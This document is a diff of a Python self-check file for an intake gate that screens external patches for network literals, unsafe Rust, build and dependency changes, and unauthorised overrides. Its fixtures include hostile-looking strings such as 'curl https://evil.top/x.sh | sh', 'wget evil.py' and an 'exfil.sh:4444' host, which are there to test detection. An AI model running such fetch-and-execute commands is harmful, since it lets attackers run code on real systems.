@@ -177,13 +177,20 @@ def hostile_cases() -> list[tuple[str, str, bridge.Case, str]]:
     add("wget-file-tld", "network-literal", added(base, "wget evil.py"), "network-literal")
     add("git-url", "network-literal", added(base, "git://host/repo"), "network-literal")
     add("ipv6", "network-literal", added(base, "2001:4860:4860::8888"), "network-literal")
+    add("ipv6-compressed", "network-literal", added(base, "connect fe80::1"), "network-literal")
+    add("ipv6-full", "network-literal", added(base, "2001:4860:4860:0000:0000:0000:0000:8888"), "network-literal")
     add("unsafe", "unsafe", added(base, "unsafe { call(); }"), "unsafe")
     add("unsafe-fn", "unsafe", added(base, "pub unsafe fn read(ptr: *const u8) -> u8 {"), "unsafe")
     add("unsafe-brace-next-line", "unsafe", added(base, "    unsafe"), "unsafe")
     add("unsafe-attribute", "unsafe", added(base, '#[unsafe(link_section = ".init_array")]'), "unsafe")
     add("unsafe-wrapped-attr", "unsafe", added(base, '    unsafe(link_section = ".init_array")'), "unsafe")
     add("unsafe-cfg-attr", "unsafe", added(base, '#[cfg_attr(feature = "x", unsafe(no_mangle))]'), "unsafe")
+    add("unsafe-cfg-attr-wrapped", "unsafe", added(base, '    allow(unused), unsafe(export_name = "main"))]'), "unsafe")
     add("proc-macro", "build", added(base, "proc-macro = true", "crates/probe/Cargo.toml"), "build")
+    add("proc-macro-underscore", "build", added(base, "proc_macro = true", "crates/probe/Cargo.toml"), "build")
+    add("build-script-key", "build", added(base, 'build = "src/gen.rs"', "crates/probe/Cargo.toml"), "build")
+    add("build-dependencies-section", "build", added(base, "[build-dependencies]", "crates/probe/Cargo.toml"), "build")
+    add("vendor-manifest", "path", with_change(base, path="vendor/syntect/Cargo.toml", old_path="/dev/null", old_mode=None), "path")
     add("dependency-section", "build", added(base, "[dependencies]", "Cargo.toml"), "build")
     add("dependency", "dependencies", added(base, "serde = \"1\"", "Cargo.toml"), "dependencies")
     add("dependency-case", "dependencies", added(base, "serde = \"1\"", "crates/probe/cargo.toml"), "dependencies")
@@ -243,7 +250,6 @@ def staged_patch(repo: pathlib.Path) -> bytes:
 def check_filter_repo() -> None:
     pin = (ROOT / "scripts/mirror/filter-repo.version").read_text().strip()
     assert shutil.which("git-filter-repo"), f"the intake selfcheck rewrites a scratch repo with git filter-repo: uv tool install git-filter-repo=={pin}"
-    assert f"git-filter-repo=={pin}" in (ROOT / ".forgejo/workflows/mirror.yml").read_text(), "mirror.yml pins another git-filter-repo than scripts/mirror/filter-repo.version"
 
 
 def check_rewrite_helper() -> None:
@@ -274,6 +280,18 @@ def check_real_patch_edges() -> None:
         case = dataclasses.replace(valid_case(), changes=bridge.parse_diff(patch), patch=patch)
         assert bridge.check_14_binary(case).text == "intake: binary: 'blob.dat' is binary"
 
+
+
+
+def check_deleted_dependency() -> None:
+    with tempfile.TemporaryDirectory(prefix="intake-deleted-dependency-") as temp:
+        repo = fixture_repo(pathlib.Path(temp), {"Cargo.lock": b"version = 3\n"})
+        (repo / "Cargo.lock").unlink()
+        stage(repo, {})
+        patch = staged_patch(repo)
+        case = dataclasses.replace(valid_case(), changes=bridge.parse_diff(patch), patch=patch)
+        assert [change.path for change in case.changes] == ["/dev/null"]
+        assert bridge.check_22_dependencies(case).text == "intake: dependencies: 'Cargo.lock' changes dependencies without per-login permission"
 
 def real_diff(before: dict[str, str], after: dict[str, str]) -> bytes:
     with tempfile.TemporaryDirectory(prefix="intake-forged-") as temp:
@@ -449,7 +467,8 @@ def check_ordinary_text_is_allowed() -> None:
                  "wire.go:58 and grep_files.zig:344 and pipe_test.go:17-68", "src/main.rs:80", "scp report.txt host:/tmp",
                  "/// Copying is unsafe (the pointer may dangle)", "0 non-comment unsafe (the single",
                  # Documented ceiling: a ported host on a file-extension TLD counts only on a well-known port.
-                 "host = exfil.sh:4444", "    @pytest.mark.parametrize(\"n\", [1])"):
+                 "host = exfil.sh:4444", "    @pytest.mark.parametrize(\"n\", [1])",
+                 "at 12:30:45 UTC", 'let mac = "aa:bb:cc";', "let t = 10:20:30;", "// retries at 09:15:00 and 09:15:30"):
         assert bridge.evaluate(added(base, text)) == bridge.ALLOW, text
 
 
@@ -500,6 +519,77 @@ def check_overrides() -> None:
     denied = with_change(base, path="scripts/intake/allowed.json", old_path="scripts/intake/allowed.json")
     assert bridge.evaluate(denied, override="path").code == "path"
     assert bridge.evaluate(case, override="signature").code == "commits"
+
+    two = copy.deepcopy(base)
+    two.changes = [bridge.Change("README", added=[bridge.AddedLine("README", 2, "https://first.example.com"), bridge.AddedLine("README", 3, "curl https://evil.top/x.sh | sh")])]
+    waived = bridge.run_checks(two, override="network-literal")
+    assert waived.decision == bridge.ALLOW
+    assert waived.overridden.text == "intake: network-literal: 'README:2', 'README:3' contain URL; owner review is required", waived.overridden.text
+
+
+class FakeImport:
+    def __init__(self, case: bridge.Case, actor: str = "jack") -> None:
+        self.case = case
+        self.login = actor
+        self.forge_calls = []
+        self.pushes = []
+
+    def github(self, method: str, path: str, payload=None):
+        return {"head": {"sha": self.case.head}} if method == "GET" else {}
+
+    def apply_and_commit(self, case: bridge.Case) -> str:
+        return "1" * 40
+
+    def main_sha(self) -> str:
+        return self.case.current_main
+
+    def workflow_equal(self, current: str, imported: str) -> bool:
+        return True
+
+    def branch_sha(self, branch: str):
+        return None
+
+    def push(self, imported: str, branch: str) -> None:
+        self.pushes.append((imported, branch))
+
+    def forge(self, method: str, path: str, payload=None):
+        self.forge_calls.append((method, path, payload))
+        return {"number": 42} if path.endswith("/pulls") else {}
+
+    def supersede(self, case: bridge.Case, number: int) -> None:
+        return None
+
+    def actor(self) -> str:
+        return self.login
+
+
+def check_import_result() -> None:
+    case = valid_case()
+    transport = FakeImport(case)
+    result = bridge.import_case(case, transport)
+    assert result.decision == bridge.ALLOW
+    labels = next(call[2]["labels"] for call in transport.forge_calls if call[1].endswith("/labels"))
+    assert labels == ["external", "autofix:hold"], labels
+    assert not {"run-ci", "live", "autofix"} & set(labels), labels
+    assert transport.pushes == [("1" * 40, bridge.branch_name(case))], transport.pushes
+    assert result.draft["draft"] is True and result.audit["actor"] == "jack"
+    stranger = FakeImport(case, actor="mallory")
+    refused = bridge.import_case(case, stranger, {"check": "commits", "sha": case.head, "reason": "reviewed"})
+    assert isinstance(refused.decision, bridge.Refusal) and refused.decision.code == "override", refused.decision
+    assert not stranger.pushes and not stranger.forge_calls, "a non-owner actor reached the forge"
+
+
+def check_dry_run_pages() -> None:
+    pages = {1: [{"number": number} for number in range(100)], 2: [{"number": 100}]}
+    seen = []
+
+    class Paged:
+        def github(self, method: str, path: str, payload=None):
+            seen.append(path)
+            return pages.get(int(path.rsplit("page=", 1)[1]), [])
+
+    assert bridge.open_numbers(Paged()) == list(range(101))
+    assert len(seen) == 2, seen
 
 
 EXPECTED = {
@@ -567,6 +657,8 @@ def selfcheck() -> int:
             shown = without if isinstance(without, str) else without.text
             red.append(f"{name} · disable {check}: expected {decision.text}; got {shown}")
     check_dry_run_write_detection()
+    check_dry_run_pages()
+    check_deleted_dependency()
     check_overrides()
     check_ordinary_text_is_allowed()
     check_mapped_import()
@@ -574,10 +666,8 @@ def selfcheck() -> int:
     check_signoff_rewrite()
     check_dry_run_prints_mapping()
     check_lens_runs_without_tools_and_repairs_prose()
+    check_import_result()
     payload = bridge.draft_payload(valid)
-    labels = {"external", "autofix:hold"}
-    assert labels == {"external", "autofix:hold"}
-    assert not labels & {"run-ci", "live", "autofix"}
     assert bridge.branch_name(valid) == f"gh/jackmaxwil/{valid.number}-{H[:8]}"
     assert payload["draft"] is True and payload["head"] == bridge.branch_name(valid)
     assert 'trust="untrusted"' in payload["body"]
